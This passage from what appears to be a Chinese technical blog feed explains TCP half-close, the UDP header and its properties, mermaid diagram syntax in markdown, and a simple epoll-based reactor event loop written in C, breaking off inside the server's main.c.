TCP 的<strong>半关闭</strong>（half-close）特性，TCP 提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力。</p><p>任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入<strong>半关闭状态</strong>。当另一方也没有数据再发送的时候，则发出连接释放通知，对方确认后就<strong>完全关闭</strong>了TCP连接。</p><p>通俗的来说，两次握手就可以释放一端到另一端的 TCP 连接，完全释放连接一共需要四次握手</p><p><strong>为什么第二次挥手完成之后客户端到服务端的连接已经释放了,第四次挥手仍然能够发送ACK报文给服务端？</strong></p><p>客户端到服务端连接释放后,只是服务端不在接受来自客户端发送报文的应用数据,而ACK是放在TCP头中的,因此这和客户端到服务端连接释放,但是客户端仍然能够发送ACK报文给服务端</p><h5 id="6-2-UDP协议"><a href="#6-2-UDP协议" class="headerlink" title="6.2.UDP协议"></a>6.2.UDP协议</h5><p>UDP（UserDatagramProtocol）是一个简单的面向消息的传输层协议，尽管UDP提供标头和有效负载的完整性验证（通过校验和），但它不保证向上层协议提供消息传递，并且UDP层在发送后不会保留UDP 消息的状态。因此，UDP有时被称为不可靠的数据报协议。如果需要传输可靠性，则必须在用户应用程序中实现。</p><p>UDP使用具有最小协议机制的简单无连接通信模型。UDP提供数据完整性的校验和，以及用于在数据报的源和目标寻址不同函数的端口号。它没有握手对话，因此将用户的程序暴露在底层网络的任何不可靠的方面。如果在网络接口级别需要纠错功能，应用程序可以使用为此目的设计的传输控制协议（TCP）。</p><h5 id="UDP包头"><a href="#UDP包头" class="headerlink" title="UDP包头"></a>UDP包头</h5><ul><li><p>1.源端口号(16bit)</p><p>发送端的端口号</p></li><li><p>2.目标端口号(16bit)</p><p>目的端的端口号</p></li><li><p>3.总长度(16bit)</p><p>数据包的总长度</p></li><li><p>4.校验和(16bit)</p><p>数据包的校验和</p></li></ul><p><strong>UDP的特点</strong></p><p>1.UDP是无连接的，即发送数据之前不需要建立连接，因此减少了开销和发送数据之前的时延。</p><p>2.UDP使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的连接状态表。</p><p>3.UDP是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付IP层。UDP对应用层交下来的报文，既不合并，也不拆分，而是保留这些报文的边界。因此，应用程序必须选择合适大小的报文。</p><p>4.UDP没有拥塞控制，因此网络出现的拥塞不会使源主机的发送速率降低。很多的实时应用（如IP电话、实时视频会议等）要去源主机以恒定的速率发送数据，并且允许在网络发生拥塞时丢失一些数据，但却不允许数据有太多的时延。UDP正好符合这种要求。</p><p>5.UDP支持一对一、一对多、多对一和多对多的交互通信。</p><p>6.UDP的首部开销小，只有8个字节，比TCP的20个字节的首部要短。</p><p>参考:</p><p>维基百科</p><p><a href="https://segmentfault.com/a/1190000039165592">https://segmentfault.com/a/1190000039165592</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">https://zhuanlan.zhihu.com/p/53374516</a></p><p><a href="https://blog.csdn.net/qq_30549833/article/details/60139328">https://blog.csdn.net/qq_30549833/article/details/60139328</a></p><p><a href="https://blog.51cto.com/u_13854765/2163296">https://blog.51cto.com/u_13854765/2163296</a></p><p><a href="https://blog.csdn.net/why_still_confused/article/details/51658930">https://blog.csdn.net/why_still_confused/article/details/51658930</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown画流程图</title>
    <link href="/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/"/>
    <url>/2022/04/18/markdown%E7%94%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="markdown画流程图"><a href="#markdown画流程图" class="headerlink" title="markdown画流程图"></a>markdown画流程图</h1><h4 id="1-mermaid"><a href="#1-mermaid" class="headerlink" title="1.mermaid"></a>1.mermaid</h4><p>mermaid是一种类似于markdown的脚本语言,通过javascript语言将文本转化为图片</p><h5 id="1-流程图"><a href="#1-流程图" class="headerlink" title="1.流程图"></a>1.流程图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">graph TD;<br>    A--&gt;B;<br>    A--&gt;C;<br>    B--&gt;D;<br></code></pre></td></tr></table></figure><p>实际效果</p><pre><code class=" mermaid">graph TD;    A--&gt;B;    A--&gt;C;    B--&gt;D;</code></pre><h5 id="2-时序图"><a href="#2-时序图" class="headerlink" title="2.时序图"></a>2.时序图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sequenceDiagram<br>    Alice-&gt;&gt;John: Hello John, how are you?<br>    John--&gt;&gt;Alice: Great!<br></code></pre></td></tr></table></figure><p>实际效果</p><pre><code class=" mermaid">sequenceDiagram    Alice-&gt;&gt;John: Hello John, how are you?    John--&gt;&gt;Alice: Great!</code></pre><h5 id="3-状态图"><a href="#3-状态图" class="headerlink" title="3.状态图"></a>3.状态图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">stateDiagram<br>    [*] --&gt; s1<br>    s1 --&gt; [*]<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">stateDiagram    [*] --&gt; s1    s1 --&gt; [*]</code></pre><h5 id="4-类图"><a href="#4-类图" class="headerlink" title="4.类图"></a>4.类图</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">classDiagram<br>      Animal &lt;|-- Duck<br>      Animal &lt;|-- Fish<br>      Animal &lt;|-- Zebra<br>      Animal : +int age<br>      Animal : +String gender<br>      Animal: +isMammal()<br>      Animal: +mate()<br>      class Duck&#123;<br>          +String beakColor<br>          +swim()<br>          +quack()<br>      &#125;<br>      class Fish&#123;<br>          -int sizeInFeet<br>          -canEat()<br>      &#125;<br>      class Zebra&#123;<br>          +bool is_wild<br>          +run()<br>      &#125;<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">classDiagram      Animal &lt;|-- Duck      Animal &lt;|-- Fish      Animal &lt;|-- Zebra      Animal : +int age      Animal : +String gender      Animal: +isMammal()      Animal: +mate()      class Duck&#123;          +String beakColor          +swim()          +quack()      &#125;      class Fish&#123;          -int sizeInFeet          -canEat()      &#125;      class Zebra&#123;          +bool is_wild          +run()      &#125;</code></pre><h4 id="5-饼图"><a href="#5-饼图" class="headerlink" title="5.饼图"></a>5.饼图</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig<br></code></pre></td></tr></table></figure><pre><code class=" mermaid">pie    title Key elements in Product X    &quot;Calcium&quot; : 42.96    &quot;Potassium&quot; : 50.05    &quot;Magnesium&quot; : 10.01    &quot;Iron&quot; :  5</code></pre><p>参考于:<a href="https://zhuanlan.zhihu.com/p/355997933">https://zhuanlan.zhihu.com/p/355997933</a></p>]]></content>
    
    
    <categories>
      
      <category>软件配置和使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基本软件的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>reactor与libevent</title>
    <link href="/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/libevent%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="reactor模型与libevent"><a href="#reactor模型与libevent" class="headerlink" title="reactor模型与libevent"></a>reactor模型与libevent</h1><h3 id="1-什么是reactor模型"><a href="#1-什么是reactor模型" class="headerlink" title="1.什么是reactor模型?"></a>1.什么是reactor模型?</h3><h4 id="1-1-传统的同步阻塞式io模型"><a href="#1-1-传统的同步阻塞式io模型" class="headerlink" title="1.1.传统的同步阻塞式io模型"></a>1.1.传统的同步阻塞式io模型</h4><p>1.采用阻塞型io来处理事件,每个连接都需要相应的线程来完成工作.</p><p>存在问题:</p><p>当并发数变大时,会引起cpu上下文经常切换,并且要经常创建和销毁线程,系统资源占用较大</p><h4 id="1-2-reactor模型解决高并发"><a href="#1-2-reactor模型解决高并发" class="headerlink" title="1.2.reactor模型解决高并发"></a>1.2.reactor模型解决高并发</h4><ul><li><p>1.基于io多路复用,多个连接共用一个阻塞对象,一个阻塞对象可以同时管理多个连接请求,</p></li><li><p>2.基于线程池技术,解决了经常性的创建和销毁线程,节省了系统资源占用</p></li></ul><h4 id="1-3-reactor模型的核心"><a href="#1-3-reactor模型的核心" class="headerlink" title="1.3.reactor模型的核心"></a>1.3.reactor模型的核心</h4><p>1.Reactor</p><p>Reactor负责监听和分发事件,</p><p>2.Handler</p><p>Handler负责实际处理事件和业务</p><h4 id="1-4-使用epoll实现一个简单的reactor模型"><a href="#1-4-使用epoll实现一个简单的reactor模型" class="headerlink" title="1.4.使用epoll实现一个简单的reactor模型"></a>1.4.使用epoll实现一个简单的reactor模型</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//myreactor.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __MYREACTOR_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MYREACTOR_H_</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_LEN 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_EVENT 100</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> base;                               <span class="hljs-comment">//epoll的事件管理器</span><br>    <span class="hljs-type">int</span> max_event;                          <span class="hljs-comment">//最大监听的事件数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>[<span class="hljs-title">MAX_EVENT</span>];</span>   <span class="hljs-comment">//存储返回发生变化的事件</span><br>    <span class="hljs-type">int</span> timeout;                            <span class="hljs-comment">//监听的超时时间</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span> *<span class="hljs-title">base</span>;</span>               <span class="hljs-comment">//事件管理器的指针</span><br>    <span class="hljs-type">int</span> fd;                                 <span class="hljs-comment">//监听的文件描述符</span><br>    <span class="hljs-type">short</span> event;                            <span class="hljs-comment">//监听的事件</span><br>    <span class="hljs-type">void</span> *arg;                              <span class="hljs-comment">//指向自己的结构体指针</span><br>    <span class="hljs-type">void</span> (*callback)(<span class="hljs-type">int</span>,<span class="hljs-type">short</span>,<span class="hljs-type">void</span>*);      <span class="hljs-comment">//回调函数</span><br>    <span class="hljs-type">int</span> status;                             <span class="hljs-comment">//状态</span><br>    <span class="hljs-type">char</span> buf[BUFFER_LEN];                   <span class="hljs-comment">//数据存储的缓冲区</span><br>    <span class="hljs-type">int</span> bufferlen;                          <span class="hljs-comment">//缓冲区数据的当前长度</span><br>&#125;;<br><span class="hljs-comment">//设置监听事件</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span>;       <span class="hljs-comment">//转换ip地址</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span>;      <span class="hljs-comment">//转换ip地址</span><br><span class="hljs-keyword">struct</span> myeventbase *<span class="hljs-title function_">event_base_new</span><span class="hljs-params">(<span class="hljs-type">int</span> max_event,<span class="hljs-type">int</span> timeout)</span>;                                                           <span class="hljs-comment">//创建一个事件管理器</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span>;                                              <span class="hljs-comment">//销毁一个事件管理器</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span>;                                                  <span class="hljs-comment">//开始循环监听事件的发生</span><br><span class="hljs-keyword">struct</span> myevent *<span class="hljs-title function_">event_new</span><span class="hljs-params">()</span>;                                                                    <span class="hljs-comment">//创建一个事件</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">event_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *event)</span>;                                                      <span class="hljs-comment">//销毁一个事件</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">eventset</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *arg,<span class="hljs-type">void</span> *callback)</span>;                          <span class="hljs-comment">//初始化一个事件对象</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">eventadd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span>;                     <span class="hljs-comment">//将监听的对象加入事件管理器</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">eventdel</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span>;                     <span class="hljs-comment">//将监听的对象从事件管理器中移除</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//myreactor.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myreactor.h&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    addr_tmp-&gt;sin_port = htons(port);<br>    <span class="hljs-keyword">if</span> (inet_pton(af, str_addr, &amp;(addr_tmp-&gt;sin_addr)) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;convert ip failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    <span class="hljs-keyword">if</span> (inet_ntop(af, &amp;(addr_tmp-&gt;sin_addr), str_addr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *port = ntohs(addr_tmp-&gt;sin_port);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">struct</span> myeventbase *<span class="hljs-title function_">event_base_new</span><span class="hljs-params">(<span class="hljs-type">int</span> max_event,<span class="hljs-type">int</span> timeout)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myeventbase</span> *<span class="hljs-title">base</span> =</span> (<span class="hljs-keyword">struct</span> myeventbase *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> myeventbase));<br>    base-&gt;base = epoll_create(<span class="hljs-number">10</span>);<br>    base-&gt;max_event = max_event;<br>    base-&gt;timeout = timeout;<br>    <span class="hljs-keyword">return</span> base;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">event_base_loop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-type">int</span> count = epoll_wait(base-&gt;base,base-&gt;events,MAX_EVENT,base-&gt;timeout);<br>        <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;epoll wait expired!\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;count;i++)<br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">event</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)base-&gt;events[i].data.ptr;<br>            <span class="hljs-keyword">if</span>((event-&gt;event &amp; EPOLLIN )&amp;&amp; (base-&gt;events[i].events &amp; EPOLLIN))<br>            &#123;<br>                <span class="hljs-comment">//写事件发生</span><br>                event-&gt;callback(event-&gt;fd,event-&gt;event,event);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">event_base_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base)</span><br>&#123;<br>    <span class="hljs-built_in">free</span>(base);<br>&#125;<br><span class="hljs-keyword">struct</span> myevent *<span class="hljs-title function_">event_new</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">myevent</span> *<span class="hljs-title">myevent</span> =</span> (<span class="hljs-keyword">struct</span> myevent *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> myevent));<br>    <span class="hljs-keyword">return</span> myevent;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">event_destroy</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *event)</span><br>&#123;<br>    <span class="hljs-built_in">free</span>(event);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">eventset</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">int</span> fd,<span class="hljs-type">void</span> *arg,<span class="hljs-type">void</span> *callback)</span><br>&#123;<br>    myevent-&gt;fd = fd;<br>    myevent-&gt;arg = arg;<br>    myevent-&gt;callback = callback;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">eventadd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span><br>&#123;<br>    myevent-&gt;base = base;<br>    myevent-&gt;event = event;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>;</span><br>    events.data.ptr = (<span class="hljs-type">void</span> *)myevent;<br>    events.events = event;<br>    epoll_ctl(base-&gt;base,EPOLL_CTL_ADD,myevent-&gt;fd,&amp;events);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">eventdel</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> myeventbase *base,<span class="hljs-keyword">struct</span> myevent *myevent,<span class="hljs-type">short</span> event)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">events</span>;</span><br>    events.data.ptr = (<span class="hljs-type">void</span>*)myevent;<br>    events.events = event;<br>    epoll_ctl(base-&gt;base,EPOLL_CTL_DEL,myevent-&gt;fd,&amp;events);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/epoll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;myreactor.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_EVENTS 100</span><br><span class="hljs-type">socklen_t</span> SOCKLEN = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr);<br><span class="hljs-type">int</span> <span class="hljs-title function_">NewSocket</span><span class="hljs-params">(<span class="hljs-type">char</span> *addr, <span class="hljs-type">char</span> *port, <span class="hljs-type">int</span> backlog)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">ADDR</span>;</span><br>    ADDR.sin_family = AF_INET;<br>    convertip_to_net(AF_INET, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;ADDR, addr, atoi(port));<br>    <span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-comment">//与客户端实际通信的函数</span><br><span class="hljs-type">static</span> <span 